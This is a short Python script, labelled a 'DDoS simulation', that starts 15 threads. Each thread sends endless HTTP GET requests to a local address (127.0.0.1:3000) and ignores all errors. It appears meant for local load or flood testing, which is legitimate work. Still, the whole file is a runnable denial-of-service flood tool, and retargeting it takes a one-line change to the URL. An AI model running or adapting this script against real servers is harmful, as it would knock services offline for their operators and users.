import requests
import time
import threading

TARGET_URL = "http://127.0.0.1:3000"
NUM_THREADS = 15 

def send_flood():
    session = requests.Session()
    while True:
        try:
            session.get(TARGET_URL)
        except:
            pass 

print(f"Starting DDoS simulation on {TARGET_URL}...")
for i in range(NUM_THREADS):
    threading.Thread(target=send_flood, daemon=True).start()

while True:
    time.sleep(1)